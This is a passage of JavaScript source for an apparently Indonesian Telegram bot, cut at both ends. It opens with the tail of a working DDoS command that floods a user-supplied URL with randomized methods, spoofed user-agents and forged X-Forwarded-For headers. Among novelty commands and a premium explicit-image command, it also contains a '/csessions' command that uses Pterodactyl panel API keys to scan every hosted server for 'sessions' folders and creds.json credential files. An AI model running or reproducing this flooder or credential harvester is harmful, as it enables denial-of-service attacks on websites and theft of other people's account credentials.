    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.107.0.0 Safari/537.36 Edg/99.107.1418.24',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko, Foregenix) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.143 YaBrowser/22.5.0.1816 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1096 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77 (Edition Yx)',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.3.281 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Core/1.94.175.400 QQBrowser/11.1.5155.400',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Core/1.94.186.400 QQBrowser/11.3.5195.400',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36 Puffin/9.0.1.982WD',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
    'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 05)',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh_CN) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0 baidubrowser/1.x Safari/534.7',
    'Mozilla/5.0 (X11; CrOS aarch64 14526.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.82 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14989.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15054.114.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.112.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.87.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15183.38.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/67.0.3396.99 Chrome/67.0.3396.99 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 OPR/89.0.4447.38',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1110 (beta) Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 YaBrowser/22.9.3.894 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.43',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0 (Edition beta)',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.15.2 Chrome/83.0.4103.122 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) splash Version/10.0 Safari/602.1',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Opera/9.80 (Android; Opera Mini/7.6.40234/191.278; U; ru) Presto/2.12.423 Version/12.16'  
            ],
            methods: ["GET", "POST", "HEAD", "OPTIONS"]
        };

        let totalRequests = 0;
        let successfulAttacks = 0;
        const startTime = Date.now();
        const attackPromises = [];

        // Engine Loop
        for (let i = 0; i < attackConfig.threads; i++) {
            attackPromises.push(new Promise(async (resolve) => {
                let threadRequests = 0;
                
                while (Date.now() - startTime < attackConfig.duration && threadRequests < attackConfig.requestsPerThread) {
                    try {
                        const method = attackConfig.methods[Math.floor(Math.random() * attackConfig.methods.length)];
                        const userAgent = attackConfig.userAgents[Math.floor(Math.random() * attackConfig.userAgents.length)];
                        const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

                        const headers = {
                            "X-Forwarded-For": ip,
                            "X-Real-IP": ip,
                            "User-Agent": userAgent,
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                            "Accept-Language": "en-US,en;q=0.5",
                            "Connection": "keep-alive",
                            "Cache-Control": "no-cache"
                        };

                        const randomPaths = ["/", "/admin", "/api", "/login", "/test"];
                        const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
                        const attackUrl = target_url.endsWith('/') ? target_url + randomPath.substring(1) : target_url + randomPath;

                        const response = await axios({
                            method: method,
                            url: attackUrl,
                            headers: headers,
                            timeout: 5000,
                            validateStatus: () => true
                        });

                        totalRequests++;
                        threadRequests++;
                        
                        if (response.status < 500) {
                            successfulAttacks++;
                        }

                        // Update Status setiap 100 request
                        if (totalRequests % 100 === 0) {
                            const elapsed = Math.floor((Date.now() - startTime) / 1000);
                            await ctx.telegram.editMessageText(
                                ctx.chat.id,
                                processMsg.message_id,
                                null,
                                `<blockquote><strong>
⬡═―—⊱ ⎧ 『 Vïðñïx Inv¡cťús』⊰―—═⬡
✧ - Target
☇ - ${target_url}
✧ - Threads
☇ - ${attackConfig.threads}
✧ - Requests
☇ - ${totalRequests}
✧ - Success
☇ - ${successfulAttacks}
✧ - Duration
☇ - ${elapsed}s
✧ - Status
☇ - Running
</strong></blockquote>`,
                                { parse_mode: "HTML" }
                            ).catch(() => {});
                        }

                        await new Promise(r => setTimeout(r, Math.random() * 50));

                    } catch (error) {
                        threadRequests++;
                        totalRequests++;
                    }
                }
                resolve();
            }));
        }

        await Promise.all(attackPromises);

        // Final Report
        const endTime = Date.now();
        const totalDuration = Math.floor((endTime - startTime) / 1000) || 1;

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processMsg.message_id,
            null,
            `<blockquote><strong>
⬡═―—⊱ ⎧ 『 Vïðñïx Inv¡cťús』⊰―—═⬡
✧ - Target
☇ - ${target_url}
✧ - Threads
☇ - ${attackConfig.threads}
✧ - Total Requests
☇ - ${totalRequests}
✧ - Successful
☇ - ${successfulAttacks}
✧ - Total Duration
☇ - ${totalDuration}s
✧ - Requests/Sec
☇ - ${Math.floor(totalRequests / totalDuration)}
✧ - Status
☇ - Completed
</strong></blockquote>`,
            { parse_mode: "HTML" }
        ).catch(() => {});

    } catch (error) {
        console.error(error);
        ctx.reply("❌ ☇ Gagal melakukan serangan ddos");
    }
});
    
bot.command("gaymeter", (ctx) => {
    const percent = Math.floor(Math.random() * 101);
    ctx.reply(`🌈 Gaymeter kamu: ${percent}%`);
  }); 
  const kalimat = [
    "👻 Kamu merasa ada yang mengawasimu...",
    "😱 Bayangan hitam muncul di pojok ruangan.",
    "💀 Terdengar suara menyeramkan: 'Kembalikan bonekaku...'",
    "🕯️ Lilin tiba-tiba padam dan suhu menjadi dingin.",
    "🔪 Sosok putih berdiri di depan cermin.",
    "📞 Telepon berdering, tapi tak ada suara saat diangkat.",
    "📺 TV menyala sendiri dengan suara statik keras.",
    "🚪 Pintu kamar bergoyang sendiri di tengah malam.",
    "🩸 Ada jejak kaki basah padahal lantai kering.",
    "🪞 Cermin retak tanpa sebab, ada tulisan 'I see you'.",
    "🕳️ Kamu mendengar bisikan di telingamu.",
    "🩻 Tiba-tiba jantungmu berdetak cepat, entah kenapa.",
    "📸 Kamera menangkap sosok bayangan di belakangmu.",
    "📷 Foto lama berubah sendiri, ada sosok baru muncul.",
    "⛓️ Rantai besi berbunyi seperti diseret... semakin dekat."
  ];
  bot.command("ghost", (ctx) => {
    const hasil = kalimat[Math.floor(Math.random() * kalimat.length)];
    ctx.reply(hasil);
  });
  bot.command("hack", (ctx) => {
    const target = ctx.message.text.split(" ")[1] || "target";
    ctx.reply(`🛠️ Hacking ${target}...\n📡 Mengambil IP...\n🔓 Password ditemukan: 272011`);
  });
  bot.command("tinju", (ctx) => {
    const target = ctx.message.text.split(" ").slice(1).join(" ") || "orang asing";
    ctx.reply(`🥊 Kamu meninju ${target} sampai terbang!`);
  }); 
  bot.command('countryinfo', async (ctx) => {
    try {
      const input = ctx.message.text.split(' ').slice(1).join(' ');
      if (!input) {
        return ctx.reply('Masukkan nama negara setelah perintah.\n\nContoh:\n`/countryinfo Indonesia`', { parse_mode: 'Markdown' });
      }

      const res = await axios.post('https://api.siputzx.my.id/api/tools/countryInfo', {
        name: input
      });

      const { data } = res.data;

      if (!data) {
        return ctx.reply('Negara tidak ditemukan atau tidak valid.');
      }

      const caption = `
🌍 *${data.name}* (${res.data.searchMetadata.originalQuery})
📍 *Capital:* ${data.capital}
📞 *Phone Code:* ${data.phoneCode}
🌐 *Continent:* ${data.continent.name} ${data.continent.emoji}
🗺️ [Google Maps](${data.googleMapsLink})
📏 *Area:* ${data.area.squareKilometers} km²
🏳️ *TLD:* ${data.internetTLD}
💰 *Currency:* ${data.currency}
🗣️ *Languages:* ${data.languages.native.join(', ')}
🧭 *Driving Side:* ${data.drivingSide}
⚖️ *Government:* ${data.constitutionalForm}
🍺 *Alcohol Prohibition:* ${data.alcoholProhibition}
🌟 *Famous For:* ${data.famousFor}
      `.trim();

      await ctx.replyWithPhoto(
        { url: data.flag },
        {
          caption,
          parse_mode: 'Markdown',
        }
      );

     
      if (data.neighbors && data.neighbors.length) {
        const neighborText = data.neighbors.map(n => `🧭 *${n.name}*\n📍 [Maps](https://www.google.com/maps/place/${n.coordinates.latitude},${n.coordinates.longitude})`).join('\n\n');
        await ctx.reply(`🌐 *Negara Tetangga:*\n\n${neighborText}`, { parse_mode: 'Markdown' });
      }

    } catch (err) {
      console.error(err);
      ctx.reply('Gagal mengambil informasi negara. Coba lagi nanti atau pastikan nama negara valid.');
    }
  });   
  
bot.command("tourl", async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❗ Reply ke media (foto/video/audio/doc/sticker) lalu kirim /tourl");
  try {
    const pick = r.photo?.slice(-1)[0]?.file_id || r.video?.file_id || r.document?.file_id || r.audio?.file_id || r.voice?.file_id || r.sticker?.file_id;
    if (!pick) return ctx.reply("❌ Tidak menemukan media valid.");
    const link = await ctx.telegram.getFileLink(pick);
    ctx.reply(`🔗 ${link}`);
  } catch { ctx.reply("❌ Gagal membuat URL media."); }
});
const listHentai = [
  {"url": "https://files.catbox.moe/5wt81f.jpg"},
  {"url": "https://files.catbox.moe/xdqj22.jpg"},
  {"url": "https://files.catbox.moe/lvafhj.jpg"},
  {"url": "https://files.catbox.moe/em6j1f.jpg"},
  {"url": "https://files.catbox.moe/5bgyld.jpg"},
  {"url": "https://files.catbox.moe/orafro.jpg"},
  {"url": "https://files.catbox.moe/lcm9x3.jpg"},
  {"url": "https://files.catbox.moe/x3ux77.jpg"},
  {"url": "https://files.catbox.moe/f5ucmj.jpg"},
  {"url": "https://files.catbox.moe/djq46h.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/w0225y.jpg"},
  {"url": "https://files.catbox.moe/fqm5fg.jpg"},
  {"url": "https://files.catbox.moe/itv3b0.jpg"},
  {"url": "https://files.catbox.moe/s45bdq.jpg"},
  {"url": "https://files.catbox.moe/omhwvo.jpg"},
  {"url": "https://files.catbox.moe/8eaqrj.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/e99emf.jpg"}
]

bot.command('hentai', checkPremium, async (ctx) => {
  const loadingMsg = await ctx.reply('🔄 Loading hentai...');
  
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  const pick = getRandom();
  
  try {
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim hentai. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});
bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});
bot.command("getcode", async (ctx) => {
  const senderId = ctx.from.id;
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!url)
    return ctx.reply("❌ Format :: /getcode https://namaweb");
  if (!/^https?:\/\//i.test(url))
    return ctx.reply("❌ URL tidak valid.");

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000,
    });

    const htmlContent = response.data;
    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await ctx.replyWithDocument({ source: filePath }, {
      caption: `✅ Get Code By Senn Offc ( 🍦 )\nURL : ${url}`,
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error: " + err.message);
  }
});

bot.command("csessions", checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
